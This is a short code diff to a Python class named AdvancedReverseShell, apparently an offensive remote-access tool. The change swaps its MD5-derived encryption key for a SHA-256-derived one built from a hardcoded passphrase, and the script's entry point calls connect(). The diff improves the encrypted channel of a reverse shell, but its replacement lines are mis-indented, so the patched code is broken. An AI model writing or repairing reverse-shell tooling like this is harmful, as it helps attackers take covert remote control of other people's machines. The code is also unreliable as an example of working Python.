@@ -25,10 +25,11 @@ class AdvancedReverseShell:
         self.initialize_encryption()
         
     def initialize_encryption(self):
-        """Initialize AES encryption for secure communication"""
-        key_base = hashlib.md5(b'superecon_secure_channel').digest()
-        self.key = base64.urlsafe_b64encode(key_base)
-        self.cipher = Fernet(self.key)
+    """Initialize AES encryption for secure communication"""
+    # Use SHA-256 to generate a 32-byte hash, then encode it
+    key_base = hashlib.sha256(b'superecon_secure_channel').digest()
+    self.key = base64.urlsafe_b64encode(key_base[:32])  # Ensure 32 bytes
+    self.cipher = Fernet(self.key)
     
     def encrypt(self, data):
         """Encrypt data for secure transmission"""
@@ -171,3 +172,4 @@ class AdvancedReverseShell:
 
 if __name__ == "__main__":
     AdvancedReverseShell().connect()
+
